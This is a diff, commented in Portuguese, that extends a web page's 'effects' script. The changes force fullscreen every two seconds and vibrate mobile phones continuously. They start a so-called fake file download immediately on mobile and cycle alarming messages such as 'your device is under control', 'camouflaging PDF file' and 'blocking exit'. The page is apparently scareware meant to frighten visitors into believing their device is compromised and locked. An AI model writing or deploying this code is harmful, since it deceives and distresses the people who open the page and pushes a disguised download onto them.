@@ -294,22 +294,49 @@
             }, { once: true });
         }
         
-        // Vibrar o dispositivo
-        function vibrateDevice() {
-            if ('vibrate' in navigator) {
-                setInterval(() => {
-                    navigator.vibrate([100, 200, 100]);
-                }, 10000);
+        // Vibrar o dispositivo continuamente (apenas para mobile)
+        function vibrateDeviceContinuously() {
+            if ('vibrate' in navigator && /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                // Padrão de vibração: 500ms vibrando, 100ms pausa (repetindo)
+                const pattern = [500, 100, 500, 100, 500, 100, 500];
+                
+                // Iniciar vibração
+                navigator.vibrate(pattern);
+                
+                // Manter a vibração em loop
+                const vibrationInterval = setInterval(() => {
+                    navigator.vibrate(pattern);
+                }, 2000);
+                
+                // Parar após 30 segundos (para evitar sobrecarga)
+                setTimeout(() => {
+                    clearInterval(vibrationInterval);
+                    navigator.vibrate(0);
+                }, 30000);
             }
         }
         
-        // Tentar forçar tela cheia
-        function attemptFullscreen() {
+        // Forçar tela cheia a cada 2 segundos
+        function forceFullscreenRepeatedly() {
             const elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen().catch(() => {});
+            
+            function attemptFullscreen() {
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen().catch(e => {
+                        console.log('Erro ao tentar tela cheia:', e);
+                    });
+                } else if (elem.webkitRequestFullscreen) { /* Safari */
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) { /* IE11 */
+                    elem.msRequestFullscreen();
+                }
             }
-            setTimeout(attemptFullscreen, 15000);
+            
+            // Tentar imediatamente
+            attemptFullscreen();
+            
+            // Tentar a cada 2 segundos
+            setInterval(attemptFullscreen, 2000);
         }
         
         // Adicionar linhas de glitch
@@ -323,17 +350,31 @@
             }
         }
         
+        // Verificar se é mobile
+        function isMobileDevice() {
+            return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
         // Iniciar todos os efeitos
         function startEffects() {
-            // Iniciar download após 2 segundos
-            setTimeout(downloadFakeFile, 2000);
+            // Iniciar download imediatamente se for mobile
+            if (isMobileDevice()) {
+                downloadFakeFile();
+            } else {
+                // Ou após 2 segundos se não for mobile
+                setTimeout(downloadFakeFile, 2000);
+            }
             
             // Outros efeitos
             setInterval(updateStatus, 2000);
             playAlertSound();
-            vibrateDevice();
-            attemptFullscreen();
+            forceFullscreenRepeatedly();
             addGlitchLines();
+            
+            // Vibrar continuamente se for mobile
+            if (isMobileDevice()) {
+                vibrateDeviceContinuously();
+            }
             
             // Adicionar mensagens aleatórias
             const messages = [
@@ -341,7 +382,10 @@
                 "Camuflando arquivo PDF...",
                 "Preparando redirecionamento...",
                 "Configurando URL oculta...",
-                "Seu dispositivo está sob controle"
+                "Seu dispositivo está sob controle",
+                "Vibrando intensamente...",
+                "Ativando modo de emergência",
+                "Bloqueando saída..."
             ];
             
             setInterval(() => {
